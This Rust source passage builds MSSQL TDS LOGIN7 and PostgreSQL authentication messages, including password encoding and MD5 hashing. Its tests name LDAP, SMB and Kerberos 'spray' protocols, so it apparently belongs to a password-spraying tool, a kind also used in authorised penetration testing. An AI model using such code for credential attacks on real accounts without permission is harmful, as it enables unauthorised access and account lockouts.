    // TDS header
    packet.push(0x10); // LOGIN7
    packet.push(0x01); // Status: EOM

    // Placeholder for length (will be filled later)
    let len_pos = packet.len();
    packet.extend_from_slice(&[0x00, 0x00]);

    packet.extend_from_slice(&[0x00, 0x00]); // SPID
    packet.push(0x01); // Packet ID
    packet.push(0x00); // Window

    // LOGIN7 body
    let login_start = packet.len();

    // Length placeholder
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);

    // TDS version (7.0)
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x70]);

    // Packet size
    packet.extend_from_slice(&[0x00, 0x10, 0x00, 0x00]);

    // Client version
    packet.extend_from_slice(&[0x07, 0x00, 0x00, 0x00]);

    // Client PID
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);

    // Connection ID
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);

    // Option flags 1-4
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);

    // Client timezone
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);

    // Client LCID
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);

    // Variable data offset and length (simplified)
    let var_offset = 86u16; // Standard offset

    // Username offset and length
    let username_utf16: Vec<u16> = username.encode_utf16().collect();
    packet.extend_from_slice(&var_offset.to_le_bytes());
    packet.extend_from_slice(&(username_utf16.len() as u16).to_le_bytes());

    // Password offset and length
    let password_utf16: Vec<u16> = password.encode_utf16().collect();
    let pass_offset = var_offset + (username_utf16.len() * 2) as u16;
    packet.extend_from_slice(&pass_offset.to_le_bytes());
    packet.extend_from_slice(&(password_utf16.len() as u16).to_le_bytes());

    // Remaining offsets (empty)
    for _ in 0..6 {
        packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
    }

    // Variable data
    // Username (UTF-16LE)
    for c in &username_utf16 {
        packet.extend_from_slice(&c.to_le_bytes());
    }

    // Password (UTF-16LE, encrypted)
    for c in &password_utf16 {
        // TDS password encryption: swap nibbles and XOR with 0xA5
        let encrypted = ((c << 4) & 0xF0F0) | ((c >> 4) & 0x0F0F);
        let encrypted = encrypted ^ 0xA5A5;
        packet.extend_from_slice(&encrypted.to_le_bytes());
    }

    // Update lengths
    let total_len = packet.len();
    packet[len_pos] = ((total_len >> 8) & 0xFF) as u8;
    packet[len_pos + 1] = (total_len & 0xFF) as u8;

    let login_len = (total_len - login_start) as u32;
    packet[login_start..login_start + 4].copy_from_slice(&login_len.to_le_bytes());

    packet
}

/// Build PostgreSQL startup message
fn build_pg_startup_message(username: &str, database: &str) -> Vec<u8> {
    let mut msg = Vec::new();

    // Protocol version (3.0)
    msg.extend_from_slice(&[0x00, 0x03, 0x00, 0x00]);

    // Parameters
    msg.extend_from_slice(b"user\0");
    msg.extend_from_slice(username.as_bytes());
    msg.push(0);

    msg.extend_from_slice(b"database\0");
    msg.extend_from_slice(database.as_bytes());
    msg.push(0);

    // Terminator
    msg.push(0);

    // Prepend length
    let len = (msg.len() + 4) as u32;
    let mut result = len.to_be_bytes().to_vec();
    result.extend(msg);

    result
}

/// Build PostgreSQL password message
fn build_pg_password_message(password: &str, md5_params: Option<(&str, &[u8])>) -> Vec<u8> {
    let password_data = if let Some((username, salt)) = md5_params {
        // MD5 password: md5 + md5(md5(password + username) + salt)
        use md5::{Md5, Digest};

        let mut hasher = Md5::new();
        hasher.update(password.as_bytes());
        hasher.update(username.as_bytes());
        let inner = hasher.finalize();
        let inner_hex = format!("{:x}", inner);

        let mut hasher = Md5::new();
        hasher.update(inner_hex.as_bytes());
        hasher.update(salt);
        let outer = hasher.finalize();

        format!("md5{:x}", outer)
    } else {
        password.to_string()
    };

    let mut msg = Vec::new();
    msg.push(b'p'); // Password message type

    let len = (password_data.len() + 5) as u32; // length + data + null
    msg.extend_from_slice(&len.to_be_bytes());
    msg.extend_from_slice(password_data.as_bytes());
    msg.push(0);

    msg
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_mask_password() {
        assert_eq!(mask_password("password"), "p******d");
        assert_eq!(mask_password("ab"), "**");
        assert_eq!(mask_password("a"), "*");
    }

    #[test]
    fn test_spray_protocol_default_port() {
        assert_eq!(SprayProtocol::Ldap.default_port(), 389);
        assert_eq!(SprayProtocol::Smb.default_port(), 445);
        assert_eq!(SprayProtocol::Kerberos.default_port(), 88);
    }
}
